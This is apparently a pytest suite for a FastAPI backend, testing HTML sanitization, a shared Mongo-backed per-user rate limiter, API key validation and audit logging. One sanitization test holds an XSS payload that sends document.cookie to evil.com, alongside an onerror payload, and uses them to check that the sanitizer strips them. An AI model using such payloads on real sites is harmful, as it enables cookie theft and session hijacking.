"""
Comprehensive tests for API dependencies module

Tests rate limiting, input sanitization, API keys, and better-auth integration.
"""

import pytest
from unittest.mock import Mock, patch, AsyncMock
from fastapi import HTTPException, Request
import time

import app.api.dependencies as deps
from app.api.dependencies import (
    sanitize_input,
    get_api_key,
    audit_request,
    get_database_collection,
    SanitizedModel,
)


@pytest.mark.asyncio
async def test_get_database_collection_delegates():
    """get_database_collection forwards to the db layer's get_collection."""
    with patch("app.api.dependencies.get_collection", AsyncMock(return_value="coll")) as mock_get:
        result = await get_database_collection("books")
    assert result == "coll"
    mock_get.assert_awaited_once_with("books")


class TestSanitizedModel:
    def test_string_fields_are_sanitized_on_init(self):
        class Demo(SanitizedModel):
            name: str
            count: int

        demo = Demo(name="<b>Bob</b>  Smith", count=3)
        assert demo.name == "Bob Smith"  # HTML stripped, whitespace collapsed
        assert demo.count == 3  # non-string untouched


class TestInputSanitization:
    """Test input sanitization functionality"""

    def test_sanitize_input_removes_script_tags(self):
        """Test that script tags are removed"""
        text = "Hello <script>alert('xss')</script> World"
        result = sanitize_input(text)

        assert "<script>" not in result
        assert "alert" not in result
        assert "Hello" in result
        assert "World" in result

    def test_sanitize_input_removes_html_tags(self):
        """Test that HTML tags are removed"""
        text = "<div>Hello</div><p>World</p>"
        result = sanitize_input(text)

        assert "<div>" not in result
        assert "<p>" not in result
        assert "Hello" in result
        assert "World" in result

    def test_sanitize_input_normalizes_whitespace(self):
        """Test that multiple spaces are collapsed"""
        text = "Hello    World   Test"
        result = sanitize_input(text)

        assert result == "Hello World Test"

    def test_sanitize_input_trims_whitespace(self):
        """Test that leading/trailing whitespace is trimmed"""
        text = "  Hello World  "
        result = sanitize_input(text)

        assert result == "Hello World"

    def test_sanitize_input_empty_string(self):
        """Test sanitization of empty string"""
        text = ""
        result = sanitize_input(text)

        assert result == ""

    def test_sanitize_input_none(self):
        """Test sanitization of None"""
        text = None
        result = sanitize_input(text)

        assert result is None

    def test_sanitize_input_complex_xss(self):
        """Test sanitization of complex XSS attempts"""
        text = "<script>fetch('http://evil.com?'+document.cookie)</script><img src=x onerror=alert(1)>"
        result = sanitize_input(text)

        assert "script" not in result.lower()
        assert "fetch" not in result.lower()
        assert "onerror" not in result.lower()

    def test_sanitize_input_preserves_safe_text(self):
        """Test that safe text is preserved"""
        text = "This is a normal text with 123 numbers and punctuation!"
        result = sanitize_input(text)

        assert result == text.strip()


def _mock_request(path: str = "/api/test", ip: str = "10.0.0.1") -> Mock:
    """A minimal Request stand-in for calling the limiter directly."""
    request = Mock(spec=Request)
    request.client = Mock()
    request.client.host = ip
    request.url = Mock()
    request.url.path = path
    return request


USER_A = {"auth_id": "rl-user-a"}
USER_B = {"auth_id": "rl-user-b"}


@pytest.mark.asyncio
class TestRateLimiting:
    """Rate limiter: per-authenticated-user buckets in a shared Mongo store (#180).

    Uses the real limiter (`real_rate_limiter` fixture) and real Mongo
    (`motor_reinit_db`), since the whole point is the shared persistent store.
    """

    async def test_two_users_do_not_share_a_bucket(
        self, motor_reinit_db, real_rate_limiter
    ):
        """AC: user A exhausting the limit must not 429 user B on the same endpoint."""
        limiter = real_rate_limiter(limit=2, window=60)
        request = _mock_request("/api/shared-endpoint")

        with patch.object(deps.settings, "BYPASS_AUTH", False):
            await limiter(request, current_user=USER_A)
            await limiter(request, current_user=USER_A)
            with pytest.raises(HTTPException) as exc_info:
                await limiter(request, current_user=USER_A)
            assert exc_info.value.status_code == 429

            # User B is unaffected by A's exhausted bucket
            result = await limiter(request, current_user=USER_B)
        assert result["remaining"] == 1

    async def test_bucket_shared_across_limiter_instances(
        self, motor_reinit_db, real_rate_limiter
    ):
        """Two limiter closures (like two uvicorn workers) count against one bucket."""
        worker1 = real_rate_limiter(limit=3, window=60)
        worker2 = real_rate_limiter(limit=3, window=60)
        request = _mock_request("/api/multi-worker")

        with patch.object(deps.settings, "BYPASS_AUTH", False):
            await worker1(request, current_user=USER_A)
            await worker2(request, current_user=USER_A)
            await worker1(request, current_user=USER_A)
            # 4th request overall -- worker2 must see the shared count of 3
            with pytest.raises(HTTPException) as exc_info:
                await worker2(request, current_user=USER_A)

        assert exc_info.value.status_code == 429

    async def test_blocks_over_limit_with_headers(
        self, motor_reinit_db, real_rate_limiter
    ):
        """Over the limit -> 429 with the standard X-RateLimit-*/Retry-After headers."""
        limiter = real_rate_limiter(limit=3, window=60)
        request = _mock_request("/api/headers-check")

        with patch.object(deps.settings, "BYPASS_AUTH", False):
            results = [
                await limiter(request, current_user=USER_A) for _ in range(3)
            ]
            assert [r["remaining"] for r in results] == [2, 1, 0]

            with pytest.raises(HTTPException) as exc_info:
                await limiter(request, current_user=USER_A)

        assert exc_info.value.status_code == 429
        assert "Rate limit exceeded" in exc_info.value.detail
        headers = exc_info.value.headers
        assert headers["X-RateLimit-Limit"] == "3"
        assert headers["X-RateLimit-Remaining"] == "0"
        assert "X-RateLimit-Reset" in headers
        assert 0 < int(headers["Retry-After"]) <= 60

    async def test_bypass_auth_short_circuits(self, real_rate_limiter):
        """With BYPASS_AUTH on, the limiter returns full quota without counting."""
        limiter = real_rate_limiter(limit=2, window=60)
        request = _mock_request("/api/bypass")

        with patch.object(deps.settings, "BYPASS_AUTH", True):
            for _ in range(5):
                result = await limiter(request, current_user=USER_A)
                assert result["remaining"] == 2

    async def test_rate_limiter_per_endpoint(
        self, motor_reinit_db, real_rate_limiter
    ):
        """The same user gets independent buckets per endpoint."""
        limiter = real_rate_limiter(limit=2, window=60)

        with patch.object(deps.settings, "BYPASS_AUTH", False):
            await limiter(_mock_request("/api/endpoint1"), current_user=USER_A)
            await limiter(_mock_request("/api/endpoint1"), current_user=USER_A)
            result = await limiter(
                _mock_request("/api/endpoint2"), current_user=USER_A
            )
        assert result["remaining"] > 0

    async def test_rate_limiter_window_reset(
        self, motor_reinit_db, real_rate_limiter
    ):
        """A new window re-allows a user who exhausted the previous one."""
        limiter = real_rate_limiter(limit=1, window=1)  # 1-second window
        request = _mock_request("/api/window-reset")

        with patch.object(deps.settings, "BYPASS_AUTH", False):
            # Align to just after a window boundary so both calls land in one bucket
            time.sleep(1.0 - (time.time() % 1.0) + 0.05)

            await limiter(request, current_user=USER_A)
            with pytest.raises(HTTPException):
                await limiter(request, current_user=USER_A)

            time.sleep(1.0)  # next window

            result = await limiter(request, current_user=USER_A)
        assert result["remaining"] == 0

    async def test_missing_user_id_falls_back_to_client_ip(
        self, motor_reinit_db, real_rate_limiter
    ):
        """No resolvable user id -> per-IP buckets (defense in depth)."""
        limiter = real_rate_limiter(limit=1, window=60)

        with patch.object(deps.settings, "BYPASS_AUTH", False):
            await limiter(
                _mock_request("/api/ip-fallback", ip="203.0.113.1"), current_user={}
            )
            with pytest.raises(HTTPException):
                await limiter(
                    _mock_request("/api/ip-fallback", ip="203.0.113.1"),
                    current_user={},
                )
            # A different IP still passes
            result = await limiter(
                _mock_request("/api/ip-fallback", ip="203.0.113.2"), current_user={}
            )
        assert result["remaining"] == 0


@pytest.mark.asyncio
class TestAPIKey:
    """Test API key validation"""

    async def test_get_api_key_valid(self):
        """Test get_api_key with valid key"""
        api_key = "valid_api_key_123"

        result = await get_api_key(x_api_key=api_key)

        assert result == api_key

    async def test_get_api_key_missing(self):
        """Test get_api_key with missing key"""
        with pytest.raises(HTTPException) as exc_info:
            await get_api_key(x_api_key=None)

        assert exc_info.value.status_code == 401
        assert "API key is missing" in exc_info.value.detail

    async def test_get_api_key_empty(self):
        """Test get_api_key with empty key"""
        with pytest.raises(HTTPException) as exc_info:
            await get_api_key(x_api_key="")

        assert exc_info.value.status_code == 401
        assert "API key is missing" in exc_info.value.detail


@pytest.mark.asyncio
class TestAuditRequest:
    """Test audit logging functionality

    Note: audit_request no longer uses settings - it trusts that current_user
    has been authenticated by get_current_user_from_session via session cookies.
    """

    @patch("app.api.dependencies.create_audit_log")
    async def test_audit_request_with_user(self, mock_create_audit):
        """Test audit_request logs user actions correctly"""
        mock_request = Mock(spec=Request)
        mock_request.method = "GET"
        mock_request.url.path = "/api/test"
        mock_request.client.host = "192.168.1.1"
        mock_request.headers = {"user-agent": "test-agent"}
        mock_request.state = Mock()
        mock_request.state.request_id = None

        current_user = {"auth_id": "test_user", "email": "test@example.com"}

        result = await audit_request(
            request=mock_request,
            current_user=current_user,
            action="read",
            resource_type="book",
            target_id="book_123"
        )

        assert result["sub"] == "test_user"
        assert result["email"] == "test@example.com"
        mock_create_audit.assert_called_once()

    @patch("app.api.dependencies.create_audit_log")
    async def test_audit_request_with_authenticated_user(self, mock_create_audit):
        """Test audit_request with pre-authenticated user (cookie-based auth)

        Note: Authentication is now handled by get_current_user_from_session via session cookies.
        audit_request trusts that current_user has already been authenticated.
        """
        mock_request = Mock(spec=Request)
        mock_request.method = "POST"
        mock_request.url.path = "/api/books"
        mock_request.client.host = "192.168.1.1"
        mock_request.headers = {
            "user-agent": "test-agent"
        }
        mock_request.state = Mock()
        mock_request.state.request_id = "req_123"

        current_user = {"auth_id": "user_123", "email": "test@example.com"}

        result = await audit_request(
            request=mock_request,
            current_user=current_user,
            action="create",
            resource_type="book",
            target_id="book_123",
            metadata={"extra": "data"}
        )

        assert result["sub"] == "user_123"
        assert result["email"] == "test@example.com"
        mock_create_audit.assert_called_once()

    @patch("app.api.dependencies.create_audit_log")
    async def test_audit_request_logs_request_details(self, mock_create_audit):
        """Test that audit_request logs all request details correctly"""
        mock_request = Mock(spec=Request)
        mock_request.method = "DELETE"
        mock_request.url.path = "/api/books/123"
        mock_request.client.host = "10.0.0.1"
        mock_request.headers = {"user-agent": "Mozilla/5.0"}
        mock_request.state = Mock()
        mock_request.state.request_id = "req_456"

        current_user = {"auth_id": "admin_user", "email": "admin@example.com"}

        result = await audit_request(
            request=mock_request,
            current_user=current_user,
            action="delete",
            resource_type="book",
            target_id="123"
        )

        assert result["sub"] == "admin_user"
        mock_create_audit.assert_called_once()

        # Verify the audit log was called with correct parameters
        call_kwargs = mock_create_audit.call_args.kwargs
        assert call_kwargs["action"] == "delete"
        assert call_kwargs["actor_id"] == "admin_user"
        assert call_kwargs["resource_type"] == "book"
        assert call_kwargs["target_id"] == "123"

    @patch("app.api.dependencies.create_audit_log")
    async def test_audit_request_with_no_request_object(self, mock_create_audit):
        """audit_request tolerates request=None (used in non-HTTP contexts)."""
        current_user = {"clerk_id": "legacy_user", "email": "legacy@example.com"}

        result = await audit_request(
            request=None,
            current_user=current_user,
            action="cleanup",
            resource_type="session",
        )

        # Falls back to clerk_id and defaults target_id to "unknown"
        assert result["sub"] == "legacy_user"
        call_kwargs = mock_create_audit.call_args.kwargs
        assert call_kwargs["actor_id"] == "legacy_user"
        assert call_kwargs["target_id"] == "unknown"
        assert call_kwargs["details"]["method"] is None
